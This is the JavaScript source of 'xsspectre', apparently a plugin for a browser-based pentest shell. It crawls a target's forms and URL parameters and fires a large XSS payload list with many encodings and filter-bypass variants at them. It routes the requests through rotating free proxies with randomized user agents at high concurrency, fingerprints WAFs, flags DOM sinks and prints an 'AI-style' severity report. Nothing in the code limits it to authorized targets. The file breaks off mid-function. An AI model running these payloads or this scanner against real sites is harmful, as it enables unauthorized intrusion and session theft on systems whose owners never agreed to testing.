(() => {
  'use strict';
  const PKG = 'xsspectre';
  const VERSION = '1.6.0';
  const GLOBAL_KEY = `__kali_pkg_${PKG}`;
  const DEFAULTS = Object.freeze({
    timeout: 15000,
    concurrent: 500,
    delay: 0,
    retries: 2
  });
  const manifest = Object.freeze({
    name: PKG,
    version: VERSION,
    description: 'xsspectre - advanced XSS scanner with AI-style vulnerability reporting, payload generation and detection.',
    author: 'Mobin Vaghar Jalaliyeh (Kali Light)',
    help: `${PKG} help`,
    official: false,
    default: false,
    securityLevel: 'medium',
    permissions: Object.freeze({ storage: 'none', cookies: 'none', network: 'full', filesystem: 'none' }),
    commands: Object.freeze([PKG]),
    dependencies: Object.freeze([]),
    entry: 'install'
  });
  const COMMAND = Object.freeze({
    name: PKG,
    description: 'xsspectre advanced XSS scanner with payload generation, detection, precise reporting and AI-style assessment.',
    usage: `${PKG} [scan|exploit|auto|setproxy|help|info|commands|manifest|policy|selftest|version]`,
    aliases: Object.freeze([]),
    kind: 'scanner'
  });
  const state = {
    api: null,
    installed: false,
    settings: { ...DEFAULTS },
    runtime: {
      visitedUrls: new Set(),
      stats: {
        requests: 0,
        success: 0,
        failures: 0,
        reflected: 0,
        forms: 0,
        payloads: 0,
        domXss: 0
      },
      proxyList: [],
      proxyIndex: 0,
      proxyReady: false,
      customProxy: null
    }
  };
  const getApi = () => {
    if (!state.api) throw new Error('PACKAGE_BRIDGE_UNAVAILABLE');
    return state.api;
  };
  const line = (text, cls = 'output') => {
    const api = getApi();
    if (typeof api.line !== 'function') throw new Error('PACKAGE_BRIDGE_LINE_UNAVAILABLE');
    return api.line(String(text ?? ''), cls);
  };
  const spacer = () => {
    const api = getApi();
    if (typeof api.spacer !== 'function') throw new Error('PACKAGE_BRIDGE_SPACER_UNAVAILABLE');
    return api.spacer();
  };
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  function getFreeUserProxy() {
    try {
      return window.__FreeUserProxy || globalThis.__FreeUserProxy || null;
    } catch {
      return null;
    }
  }
  function isFreeUserProxyAvailable() {
    const fup = getFreeUserProxy();
    return fup && typeof fup.getWorkingProxies === 'function';
  }
  async function testCustomProxy(proxyTemplate, testUrl = 'https://httpbin.org/get') {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const url = proxyTemplate.replace('{url}', encodeURIComponent(testUrl));
      const res = await fetch(url, {
        method: 'HEAD',
        signal: controller.signal,
        mode: 'cors'
      });
      clearTimeout(timeout);
      return res.ok;
    } catch {
      return false;
    }
  }
  async function prepareProxyList(forceRefresh = false) {
    if (!forceRefresh && state.runtime.proxyReady && state.runtime.proxyList.length > 0) {
      return state.runtime.proxyList;
    }
    const fup = getFreeUserProxy();
    if (!fup || typeof fup.getWorkingProxies !== 'function') {
      throw new Error('FreeUserProxy is not available. Please ensure https://LightKALi.github.io/FreeUserProxy.js is loaded.');
    }
    let working = [];
    try {
      working = fup.getWorkingProxies() || [];
    } catch {
      working = [];
    }
    if (!Array.isArray(working)) working = [];
    if (state.runtime.customProxy && typeof state.runtime.customProxy === 'string' && state.runtime.customProxy.includes('{url}')) {
      const customOk = await testCustomProxy(state.runtime.customProxy);
      if (customOk) {
        const exists = working.some(p => p.template === state.runtime.customProxy);
        if (!exists) {
          working.push({ name: 'custom', template: state.runtime.customProxy });
        }
      }
    }
    if (working.length === 0) {
      throw new Error('No working proxies available. Please check your connection or set a custom proxy using "xsspectre setproxy <template>" command.');
    }
    state.runtime.proxyList = working;
    state.runtime.proxyReady = true;
    return working;
  }
  let proxyIndex = 0;
  function getNextProxy() {
    if (state.runtime.proxyList.length === 0) {
      throw new Error('No proxy available. Call prepareProxyList first.');
    }
    const proxy = state.runtime.proxyList[proxyIndex % state.runtime.proxyList.length];
    proxyIndex = (proxyIndex + 1) % state.runtime.proxyList.length;
    return proxy;
  }
  function getRandomUserAgent() {
    const fup = getFreeUserProxy();
    if (fup && typeof fup.getRandomUserAgent === 'function') {
      return fup.getRandomUserAgent();
    }
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';
  }
  const normalizeHeaders = (headers) => {
    const result = {};
    if (!headers) return result;
    if (headers instanceof Headers) {
      headers.forEach((value, key) => {
        result[key.toLowerCase()] = value;
      });
    } else {
      Object.entries(headers).forEach(([key, value]) => {
        result[key.toLowerCase()] = Array.isArray(value) ? value.join(', ') : value;
      });
    }
    return result;
  };
  const resolveUrl = (url, base) => {
    try {
      return new URL(url, base).href;
    } catch {
      return url;
    }
  };
  const normalizeTarget = (input) => {
    let url = String(input || '').trim();
    if (!url) throw new Error('TARGET_URL_REQUIRED');
    if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
    try {
      return new URL(url).href;
    } catch {
      throw new Error('INVALID_TARGET_URL');
    }
  };
  const limitConcurrency = async (tasks, limit = state.settings.concurrent) => {
    const results = new Array(tasks.length);
    let index = 0;
    const workerCount = Math.min(limit, tasks.length);
    const workers = new Array(workerCount).fill(0).map(async () => {
      while (index < tasks.length) {
        const current = index++;
        results[current] = await tasks[current]();
      }
    });
    await Promise.all(workers);
    return results;
  };
  const fetchWithRetry = async (url, options = {}, retries = state.settings.retries, useProxy = true) => {
    let proxies = state.runtime.proxyList;
    if (proxies.length === 0) {
      proxies = await prepareProxyList();
    }
    const maxRetries = retries ?? state.settings.retries ?? 2;
    let lastError = null;
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        const controller = new AbortController();
        const timeoutMs = options.timeout || state.settings.timeout || 15000;
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const headers = {
          'User-Agent': getRandomUserAgent(),
          ...(options.headers || {})
        };
        const fetchOptions = { ...options, headers, signal: controller.signal };
        let fetchUrl = url;
        if (useProxy !== false) {
          const proxy = options.proxy || getNextProxy();
          if (proxy) {
            fetchUrl = proxy.template.replace('{url}', encodeURIComponent(url));
          }
        }
        const response = await fetch(fetchUrl, fetchOptions);
        clearTimeout(timer);
        state.runtime.stats.requests++;
        if (response.ok) {
          state.runtime.stats.success++;
        } else {
          state.runtime.stats.failures++;
        }
        return response;
      } catch (err) {
        lastError = err;
        state.runtime.stats.failures++;
        if (attempt < maxRetries) {
          await sleep(state.settings.delay || 100 * (attempt + 1));
        }
      }
    }
    throw lastError;
  };
  const fetchText = async (url, options = {}, retries = state.settings.retries, useProxy = true) => {
    const response = await fetchWithRetry(url, options, retries, useProxy);
    return response.text();
  };
  const fetchHeadersObj = async (url, options = {}, retries = state.settings.retries, useProxy = true) => {
    const response = await fetchWithRetry(url, options, retries, useProxy);
    return normalizeHeaders(response.headers);
  };
  const extractForms = (html, baseUrl) => {
    const forms = [];
    if (typeof DOMParser !== 'undefined') {
      try {
        const doc = new DOMParser().parseFromString(html, 'text/html');
        doc.querySelectorAll('form').forEach(formEl => {
          const action = resolveUrl(formEl.getAttribute('action') || '', baseUrl);
          const method = (formEl.getAttribute('method') || 'GET').toUpperCase();
          const inputs = [];
          formEl.querySelectorAll('input, textarea, select').forEach(el => {
            const type = el.tagName === 'INPUT' ? (el.getAttribute('type') || 'text').toLowerCase() : el.tagName.toLowerCase();
            const name = el.getAttribute('name') || '';
            const value = el.getAttribute('value') || '';
            if (type !== 'hidden' && type !== 'submit' && type !== 'button' && type !== 'image' && type !== 'reset') {
              inputs.push({ name, type, value });
            } else if (name) {
              inputs.push({ name, type, value });
            }
          });
          forms.push({ action, method, inputs, html: formEl.outerHTML || '' });
        });
        return forms;
      } catch {}
    }
    const formRegex = /<form\b[^>]*>([\s\S]*?)<\/form>/gi;
    let match;
    while ((match = formRegex.exec(html)) !== null) {
      const formTag = match[0];
      const inner = match[1];
      const actionMatch = formTag.match(/action=["']?([^"'\s>]+)/i);
      const methodMatch = formTag.match(/method=["']?([^"'\s>]+)/i);
      const inputs = [];
      const inputRegex = /<(?:input|textarea|select)\b[^>]*>/gi;
      let inputMatch;
      while ((inputMatch = inputRegex.exec(inner)) !== null) {
        const tag = inputMatch[0];
        const nameMatch = tag.match(/name=["']?([^"'\s>]+)/i);
        const typeMatch = tag.match(/type=["']?([^"'\s>]+)/i);
        const valueMatch = tag.match(/value=["']?([^"'\s>]*)/i);
        const tagName = tag.startsWith('<input') ? 'input' : tag.startsWith('<textarea') ? 'textarea' : 'select';
        const type = tagName === 'input' ? (typeMatch ? typeMatch[1].toLowerCase() : 'text') : tagName;
        const name = nameMatch ? nameMatch[1] : '';
        const value = valueMatch ? valueMatch[1] : '';
        if (type !== 'hidden' && type !== 'submit' && type !== 'button' && type !== 'image' && type !== 'reset') {
          inputs.push({ name, type, value });
        } else if (name) {
          inputs.push({ name, type, value });
        }
      }
      forms.push({
        action: actionMatch ? resolveUrl(actionMatch[1], baseUrl) : baseUrl,
        method: methodMatch ? methodMatch[1].toUpperCase() : 'GET',
        inputs,
        html: formTag
      });
    }
    return forms;
  };
  const detectStandaloneInputs = (html, baseUrl) => {
    const pseudoForms = [];
    if (typeof DOMParser === 'undefined') return pseudoForms;
    try {
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const standalone = [];
      doc.querySelectorAll('input, textarea, select, [contenteditable="true"]').forEach(el => {
        if (!el.closest('form')) {
          const type = el.tagName === 'INPUT' ? (el.getAttribute('type') || 'text').toLowerCase() : el.tagName.toLowerCase();
          const name = el.getAttribute('name') || el.getAttribute('id') || '';
          if (name && type !== 'hidden' && type !== 'submit' && type !== 'button' && type !== 'image' && type !== 'reset') {
            standalone.push({ name, type, value: el.getAttribute('value') || '' });
          }
        }
      });
      if (standalone.length > 0) {
        pseudoForms.push({ action: baseUrl, method: 'GET', inputs: standalone, html: '', pseudo: true, standalone: true });
      }
    } catch {}
    return pseudoForms;
  };
  const detectUrlParameters = (url) => {
    try {
      const parsed = new URL(url);
      const params = [];
      parsed.searchParams.forEach((value, name) => {
        params.push({ name, type: 'query', value });
      });
      if (parsed.hash) {
        params.push({ name: 'hash', type: 'hash', value: parsed.hash });
      }
      return params;
    } catch {
      return [];
    }
  };
  const scoreForm = (form) => {
    let score = 0;
    const inputNames = form.inputs.map(i => (i.name || '').toLowerCase());
    const inputTypes = form.inputs.map(i => (i.type || '').toLowerCase());
    if (inputTypes.includes('password')) score += 10;
    if (inputNames.some(n => /user|email|login|pass|pwd|account|credential/i.test(n))) score += 5;
    if (form.action && /login|signin|auth|session|account/i.test(form.action)) score += 5;
    if (form.action && /search|query|find|filter/i.test(form.action)) score += 3;
    if (form.method === 'POST') score += 2;
    if (form.inputs.length > 2) score += 1;
    if (inputTypes.includes('text') || inputTypes.includes('search') || inputTypes.includes('url') || inputTypes.includes('email')) score += 2;
    if (inputTypes.includes('submit') || inputTypes.includes('button')) score += 1;
    if (form.inputs.some(i => i.name && !/^csrf|token|nonce/i.test(i.name))) score += 1;
    if (inputNames.some(n => /search|q|query|find|filter|keyword/i.test(n))) score += 3;
    if (inputNames.some(n => /comment|message|content|body|text/i.test(n))) score += 2;
    if (form.standalone) score += 4;
    return score;
  };
  const classifyFormType = (form) => {
    const signature = form.inputs.map(i => `${i.name} ${i.type}`.toLowerCase()).join(' ');
    if (/\bpassword\b|\bpass\b|\bpwd\b|\blogin\b|\bsignin\b|\bauth\b/.test(signature)) return 'login';
    if (/\bsearch\b|\bq\b|\bquery\b|\bfind\b|\bfilter\b|\bkeyword\b/.test(signature)) return 'search';
    if (/\bcomment\b|\bmessage\b|\bcontent\b|\breply\b|\breview\b|\bfeedback\b/.test(signature)) return 'comment';
    if (/\bemail\b|\bmail\b|\bcontact\b|\bfeedback\b/.test(signature)) return 'contact';
    if (/\bname\b|\bfirstname\b|\blastname\b/.test(signature)) return 'profile';
    return 'other';
  };
  const detectAllForms = (html, baseUrl, urlParams = [], standaloneForms = []) => {
    const forms = extractForms(html, baseUrl).concat(standaloneForms);
    if (urlParams.length > 0 && !forms.some(f => f.action === baseUrl && f.method === 'GET' && !f.pseudo)) {
      forms.push({ action: baseUrl, method: 'GET', inputs: urlParams, html: '', pseudo: true });
    }
    return forms.map(form => ({
      ...form,
      score: scoreForm(form),
      type: classifyFormType(form)
    }))
    .filter(form => form.inputs.length > 0 && form.inputs.some(i => i.name))
    .sort((a, b) => b.score - a.score);
  };
  const generateBasePayloads = () => {
    const payloads = [];
    const add = (payload, context, note = '') => payloads.push({ payload, context, note });
    add('<script>alert(1)</script>', 'html');
    add('<script>alert(document.domain)</script>', 'html');
    add('<script>prompt(1)</script>', 'html');
    add('<script>confirm(1)</script>', 'html');
    add('<script>document.write("<img src=x onerror=alert(1)>")</script>', 'html');
    add('<script>eval("alert(1)")</script>', 'html');
    add('<svg><script>alert(1)</script></svg>', 'html');
    add('<svg onload=alert(1)>', 'html');
    add('<svg/onload=alert(1)>', 'html');
    add('<img src=x onerror=alert(1)>', 'html');
    add('<img src=x onerror=alert(document.cookie)>', 'html');
    add('<img src=x onerror=alert(1)//>', 'html');
    add('<body onload=alert(1)>', 'html');
    add('<body onpageshow=alert(1)>', 'html');
    add('<iframe src="javascript:alert(1)"></iframe>', 'html');
    add('<iframe srcdoc="<script>alert(1)</script>"></iframe>', 'html');
    add('<details open ontoggle=alert(1)>', 'html');
    add('<marquee onstart=alert(1)>', 'html');
    add('<video><source onerror=alert(1)>', 'html');
    add('<audio src=x onerror=alert(1)>', 'html');
    add('<input autofocus onfocus=alert(1)>', 'html');
    add('<textarea autofocus onfocus=alert(1)>', 'html');
    add('<keygen autofocus onfocus=alert(1)>', 'html');
    add('<select autofocus onfocus=alert(1)>', 'html');
    add('<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">', 'html');
    add('<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>', 'html');
    add('<xss onmouseover=alert(1)>hover me</xss>', 'html');
    add('<a href="javascript:alert(1)">click</a>', 'html');
    add('<a href="data:text/html,<script>alert(1)</script>">click</a>', 'html');
    add('"><script>alert(1)</script>', 'attribute');
    add("'><script>alert(1)</script>", 'attribute');
    add('"><img src=x onerror=alert(1)>', 'attribute');
    add("'><img src=x onerror=alert(1)>", 'attribute');
    add('"><svg onload=alert(1)>', 'attribute');
    add("'><svg onload=alert(1)>", 'attribute');
    add('" autofocus onfocus=alert(1) x="', 'attribute');
    add("' autofocus onfocus=alert(1) x='", 'attribute');
    add('" onmouseover=alert(1) x="', 'attribute');
    add("' onmouseover=alert(1) x='", 'attribute');
    add('" onfocus=alert(1) autofocus x="', 'attribute');
    add("' onfocus=alert(1) autofocus x='", 'attribute');
    add('" onblur=alert(1) x="', 'attribute');
    add("' onblur=alert(1) x='", 'attribute');
    add('" onkeydown=alert(1) x="', 'attribute');
    add("' onkeydown=alert(1) x='", 'attribute');
    add('" onload=alert(1) x="', 'attribute');
    add("' onload=alert(1) x='", 'attribute');
    add('" onerror=alert(1) x="', 'attribute');
    add("' onerror=alert(1) x='", 'attribute');
    add('" onsubmit=alert(1) x="', 'attribute');
    add("' onsubmit=alert(1) x='", 'attribute');
    add('" onclick=alert(1) x="', 'attribute');
    add("' onclick=alert(1) x='", 'attribute');
    add('javascript:alert(1)', 'url');
    add('javascript:alert(document.cookie)', 'url');
    add('javascript:prompt(1)', 'url');
    add('javascript:confirm(1)', 'url');
    add('data:text/html,<script>alert(1)</script>', 'url');
    add('vbscript:msgbox(1)', 'url');
    add("';alert(1);//", 'js');
    add('";alert(1);//', 'js');
    add("'‑alert(1)‑'", 'js');
    add('"‑alert(1)‑"', 'js');
    add("';alert(document.cookie);//", 'js');
    add('";alert(document.cookie);//', 'js');
    add('</script><script>alert(1)</script>', 'js');
    add('</script><img src=x onerror=alert(1)>', 'js');
    add('</script><svg onload=alert(1)>', 'js');
    add('"\n;alert(1)//', 'js');
    add("'\n;alert(1)//", 'js');
    add('</title><script>alert(1)</script>', 'js');
    add('</textarea><script>alert(1)</script>', 'js');
    add('</script><script>alert(document.cookie)</script>', 'js');
    add('${alert(1)}', 'js', 'template-literal');
    add('{{constructor.constructor("alert(1)")()}}', 'js', 'angular-expression');
    add('{{_this.constructor.constructor("alert(1)")()}}', 'js', 'vue-expression');
    return payloads;
  };
  const encodePayload = (payload, encoding) => {
    switch (encoding) {
      case 'url': return encodeURIComponent(payload);
      case 'double-url': return encodeURIComponent(encodeURIComponent(payload));
      case 'html-entity': return payload.replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
      case 'html-entity-decimal': return payload.replace(/./g, c => '&#' + c.charCodeAt(0) + ';');
      case 'html-entity-hex': return payload.replace(/./g, c => '&#x' + c.charCodeAt(0).toString(16) + ';');
      case 'hex': return Array.from(payload).map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
      case 'base64': try { return btoa(unescape(encodeURIComponent(payload))); } catch { return payload; }
      case 'base64-url': try { return btoa(unescape(encodeURIComponent(payload))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); } catch { return payload; }
      case 'unicode': return Array.from(payload).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
      case 'js-escape': return payload.replace(/['"\\]/g, '\\$&');
      case 'css-escape': return payload.replace(/[\\'"()]/g, '\\$&');
      case 'mixed': return encodeURIComponent(payload).replace(/%/g, '%25');
      case 'utf-7': return payload.replace(/./g, c => '+' + c.charCodeAt(0).toString(16).toUpperCase() + '-');
      default: return payload;
    }
  };
  const generateXSSPayloads = () => {
    const base = generateBasePayloads();
    const result = [];
    const encodings = ['none', 'url', 'double-url', 'html-entity', 'html-entity-decimal', 'html-entity-hex', 'hex', 'base64', 'base64-url', 'unicode', 'js-escape', 'css-escape', 'mixed', 'utf-7'];
    for (const bp of base) {
      for (const enc of encodings) {
        result.push({ payload: enc === 'none' ? bp.payload : encodePayload(bp.payload, enc), context: bp.context, encoding: enc, note: bp.note || '' });
      }
    }
    const bypass = [
      { payload: '<scr<script>ipt>alert(1)</scr</script>ipt>', context: 'html', encoding: 'none', note: 'nested' },
      { payload: '<scRipT>alert(1)</scRipT>', context: 'html', encoding: 'none', note: 'mixed-case' },
      { payload: '"><img src=x onerror=alert(1) //', context: 'attribute', encoding: 'none', note: 'comment' },
      { payload: '"><img src=x onerror=alert(1)<!--', context: 'attribute', encoding: 'none', note: 'comment' },
      { payload: '"><svg/onload=alert(1)//', context: 'attribute', encoding: 'none', note: 'comment' },
      { payload: '"><svg/onload=alert(1)<!--', context: 'attribute', encoding: 'none', note: 'comment' },
      { payload: '"><img src=x onerror=alert(1) style="display:none"', context: 'attribute', encoding: 'none', note: 'hidden' },
      { payload: '"><img src=x onerror=window["al"+"ert"](1)>', context: 'attribute', encoding: 'none', note: 'js-concat' },
      { payload: '"><img src=x onerror=top["al"+"ert"](1)>', context: 'attribute', encoding: 'none', note: 'js-concat' },
      { payload: '"><img src=x onerror=alert(String.fromCharCode(49))>', context: 'attribute', encoding: 'none', note: 'char-code' },
      { payload: '\';alert(1)//', context: 'js', encoding: 'none', note: 'js-break' },
      { payload: '";alert(1)//', context: 'js', encoding: 'none', note: 'js-break' },
      { payload: '</script><svg onload=alert(1)>', context: 'js', encoding: 'none', note: 'script-break' },
      { payload: '</script><img src=x onerror=alert(1)>', context: 'js', encoding: 'none', note: 'script-break' },
      { payload: '\x3Cscript\x3Ealert(1)\x3C/script\x3E', context: 'html', encoding: 'none', note: 'hex-escape' },
      { payload: '&lt;script&gt;alert(1)&lt;/script&gt;', context: 'html', encoding: 'none', note: 'html-entity' },
      { payload: '"><img src=x onerror=alert(1) x=', context: 'attribute', encoding: 'none', note: 'trailing-equals' },
      { payload: '"><img src=x onerror=alert(1) //', context: 'attribute', encoding: 'none', note: 'comment' }
    ];
    result.push(...bypass);
    return result;
  };
  const htmlEntityDecode = (str) => {
    const textarea = document.createElement('textarea');
    textarea.innerHTML = str;
    return textarea.value;
  };
  const decodePayloadVariants = (payload) => {
    const variants = new Set();
    variants.add(payload);
    try { variants.add(decodeURIComponent(payload)); } catch {}
    try { variants.add(decodeURIComponent(decodeURIComponent(payload))); } catch {}
    variants.add(htmlEntityDecode(payload));
    try { variants.add(htmlEntityDecode(decodeURIComponent(payload))); } catch {}
    try { variants.add(decodeURIComponent(htmlEntityDecode(payload))); } catch {}
    return Array.from(variants);
  };
  const detectContext = (responseText, payload) => {
    const idx = responseText.indexOf(payload);
    if (idx === -1) return null;
    const before = responseText.substring(Math.max(0, idx - 80), idx);
    const after = responseText.substring(idx + payload.length, idx + payload.length + 80);
    if (/<script[^>]*>[\s\S]*$/.test(before) && /^[\s\S]*<\/script>/.test(after)) return 'js';
    if (/=\s*["']?$/.test(before)) {
      if (/href\s*=\s*["']?$/.test(before)) return 'url';
      if (/style\s*=\s*["']?$/.test(before)) return 'style';
      return 'attribute';
    }
    if (/^["']?\s*>/.test(after)) return 'html';
    if (/<[^>]+$/.test(before) && /^[^<]*>/.test(after)) return 'html';
    return 'html';
  };
  const analyzeResponse = (responseText, payload) => {
    let reflected = false;
    let context = null;
    let executable = false;
    const variants = decodePayloadVariants(payload);
    for (const v of variants) {
      if (responseText.includes(v)) {
        reflected = true;
        context = detectContext(responseText, v) || 'html';
        executable = ['js', 'url', 'attribute', 'html'].includes(context);
        break;
      }
    }
    if (!reflected && responseText.includes(payload)) {
      reflected = true;
      context = detectContext(responseText, payload) || 'html';
      executable = true;
    }
    return { reflected, context, executable };
  };
  const testReflectedXSS = async (targetUrl, form, input, payloadObj, options = {}) => {
    const base = form.action || targetUrl;
    const method = (form.method || 'GET').toUpperCase();
    const payload = payloadObj.payload;
    const fetchOptions = { method: method, headers: {}, retries: options.retries, useProxy: true };
    let url;
    if (method === 'GET') {
      const u = new URL(base);
      u.searchParams.set(input.name || 'q', payload);
      url = u.href;
    } else {
      url = base;
      fetchOptions.method = 'POST';
      fetchOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      const body = new URLSearchParams();
      form.inputs.forEach(inp => { body.set(inp.name, inp === input ? payload : inp.value); });
      fetchOptions.body = body.toString();
    }
    try {
      const responseText = await fetchText(url, fetchOptions, options.retries || state.settings.retries, true);
      const analysis = analyzeResponse(responseText, payload);
      return { form, input, payload: payloadObj, url, reflected: analysis.reflected, context: analysis.context, executable: analysis.executable };
    } catch {
      return { form, input, payload: payloadObj, url, reflected: false, context: null, executable: false };
    }
  };
  const testXSSOnForm = async (form, targetUrl, payloads, options = {}) => {
    const tasks = [];
    for (const p of payloads) {
      for (const input of form.inputs) {
        if (!input.name) continue;
        tasks.push(() => testReflectedXSS(targetUrl, form, input, p, options));
      }
    }
    return limitConcurrency(tasks, state.settings.concurrent || 200);
  };
  const detectWAF = (headers) => {
    const h = normalizeHeaders(headers);
    const wafs = [];
    if (h['server'] === 'cloudflare' || h['cf-ray']) wafs.push('Cloudflare');
    if ((h['server'] && /mod_security|modsecurity/i.test(h['server'])) || h['x-mod-security']) wafs.push('ModSecurity');
    if ((h['server'] && /akamai/i.test(h['server'])) || h['x-akamai-transformed']) wafs.push('Akamai');
    if (h['x-cdn'] === 'Imperva' || h['x-iinfo']) wafs.push('Imperva');
    if (h['x-sucuri-id']) wafs.push('Sucuri');
    if (h['x-wordfence']) wafs.push('Wordfence');
    if (h['x-protected-by'] && /sucuri|cloudflare|incapsula/i.test(h['x-protected-by'])) wafs.push(h['x-protected-by']);
    if (h['x-varnish'] || h['x-cache'] === 'hit' || h['x-cache'] === 'miss') wafs.push('Varnish');
    if (h['x-fastly-request-id']) wafs.push('Fastly');
    if (h['x-amz-cf-id']) wafs.push('AWS CloudFront');
    if (h['x-azure-ref']) wafs.push('Azure Front Door');
    if (h['x-cdn'] === 'CloudFront') wafs.push('CloudFront');
    if (h['x-waf'] || h['x-firewall']) wafs.push(h['x-waf'] || h['x-firewall']);
    return wafs;
  };
  const detectDomXSS = (html) => {
    const sinks = [
      { name: 'innerHTML', regex: /\.innerHTML\s*=\s*([^;]+)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'outerHTML', regex: /\.outerHTML\s*=\s*([^;]+)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'document.write', regex: /document\.write\s*\(\s*([^)]+)\s*\)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'document.writeln', regex: /document\.writeln\s*\(\s*([^)]+)\s*\)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'eval', regex: /eval\s*\(\s*([^)]+)\s*\)/gi, payload: '1);alert(1);//' },
      { name: 'setTimeout', regex: /setTimeout\s*\(\s*([^,]+)/gi, payload: '1);alert(1);//' },
      { name: 'setInterval', regex: /setInterval\s*\(\s*([^,]+)/gi, payload: '1);alert(1);//' },
      { name: 'insertAdjacentHTML', regex: /insertAdjacentHTML\s*\(\s*[^,]+,\s*([^)]+)\s*\)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'setAttribute', regex: /setAttribute\s*\(\s*['"]([^'"]+)['"]\s*,\s*([^)]+)\s*\)/gi, payload: 'onerror=alert(1)' },
      { name: 'appendChild', regex: /appendChild\s*\(\s*([^)]+)\s*\)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'insertBefore', regex: /insertBefore\s*\(\s*([^,]+)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'replaceChild', regex: /replaceChild\s*\(\s*([^,]+)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'createContextualFragment', regex: /createContextualFragment\s*\(\s*([^)]+)\s*\)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'jQuery.html', regex: /\.html\s*\(\s*([^)]+)\s*\)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'jQuery.append', regex: /\.append\s*\(\s*([^)]+)\s*\)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'jQuery.prepend', regex: /\.prepend\s*\(\s*([^)]+)\s*\)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'innerText', regex: /\.innerText\s*=\s*([^;]+)/gi, payload: '<img src=x onerror=alert(1)>' },
      { name: 'textContent', regex: /\.textContent\s*=\s*([^;]+)/gi, payload: '<img src=x onerror=alert(1)>' }
    ];
    const sources = [
      { name: 'location.search', regex: /location\.search/i },
      { name: 'location.hash', regex: /location\.hash/i },
      { name: 'URLSearchParams', regex: /URLSearchParams/i },
      { name: 'document.URL', regex: /document\.URL/i },
      { name: 'document.referrer', regex: /document\.referrer/i },
      { name: 'window.name', regex: /window\.name/i },
      { name: 'location.href', regex: /location\.href/i },
      { name: 'document.location', regex: /document\.location/i }
    ];
    const findings = [];
    const scriptRegex = /<script\b[^>]*>([\s\S]*?)<\/script>/gi;
    let m;
    while ((m = scriptRegex.exec(html)) !== null) {
      const scriptContent = m[1];
      for (const sink of sinks) {
        let sm;
        sink.regex.lastIndex = 0;
        while ((sm = sink.regex.exec(scriptContent)) !== null) {
          const expression = sm[1];
          for (const source of sources) {
            if (source.regex.test(expression) || source.regex.test(scriptContent)) {
              const lineNum = html.substring(0, m.index).split('\n').length;
              findings.push({ type: 'dom', sink: sink.name, source: source.name, payload: sink.payload, code: sm[0].substring(0, 120), line: lineNum });
              break;
            }
          }
        }
      }
    }
    const inlineAttrRegex = /<[^>]+(on\w+)=["']([^"']*)["'][^>]*>/gi;
    let am;
    while ((am = inlineAttrRegex.exec(html)) !== null) {
      const attr = am[1];
      const value = am[2];
      if (/location|URLSearchParams|document\.URL|document\.referrer|window\.name/i.test(value)) {
        const lineNum = html.substring(0, am.index).split('\n').length;
        findings.push({ type: 'dom', sink: attr, source: 'inline', payload: 'alert(1)', code: am[0].substring(0, 120), line: lineNum });
      }
    }
    return findings;
  };
  const generateAiReport = (data, stats) => {
    const out = [];
    const add = (text, cls = 'output') => out.push(line(text, cls));
    const reflectedResults = data.results ? data.results.filter(r => r.reflected) : [];
    const execResults = reflectedResults.filter(r => r.executable);
    const domFindings = data.domXss || [];
    const hasReflected = execResults.length > 0;
    const hasDom = domFindings.length > 0;
    const hasWafs = data.wafs && data.wafs.length > 0;
    const severity = (hasReflected && hasDom) ? 'CRITICAL' : hasReflected ? 'HIGH' : hasDom ? 'MEDIUM' : 'LOW';
    const phrases = {
      critical: ['This is a critical finding that should be reported immediately.', 'The target is susceptible to multiple XSS vectors, increasing the risk significantly.'],
      high: ['A high-severity XSS vulnerability has been identified.', 'This flaw allows an attacker to execute arbitrary JavaScript in the victim\'s browser.'],
      medium: ['A medium-severity DOM-based XSS issue has been detected.', 'While not directly reflected, the vulnerable sink can be exploited through crafted URLs.'],
      low: ['Low-risk XSS or injection points were observed.', 'Further manual testing is recommended to confirm exploitability.']
    };
    const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
    add('');
    add('AI Vulnerability Assessment', 'accent');
    add('─'.repeat(60), 'muted');
    add(`Severity: ${severity}`, severity === 'CRITICAL' || severity === 'HIGH' ? 'danger' : severity === 'MEDIUM' ? 'warning' : 'muted');
    add('');
    if (severity === 'CRITICAL' || severity === 'HIGH') {
      add(pick(phrases.critical), 'danger');
      add('');
      if (hasReflected) {
        add('The scanner has confirmed reflected XSS. The following payload successfully executed in the response:', 'output');
        add(`• Payload: ${execResults[0].payload.payload}`, 'danger');
        add(`• Input Field: ${execResults[0].input.name}`, 'muted');
        add(`• Context: ${execResults[0].context || 'unknown'}`, 'muted');
        add(`• Vulnerable URL: ${execResults[0].url}`, 'muted');
        add('This indicates that the application fails to sanitize user input before reflecting it back, allowing script injection.', 'output');
      }
      if (hasDom) {
        add('Additionally, DOM-based XSS sinks were identified that may be exploitable via crafted URLs:', 'output');
        domFindings.slice(0, 3).forEach((d, i) => {
          add(`• Line ${d.line}: Sink "${d.sink}" uses source "${d.source}"`, 'warning');
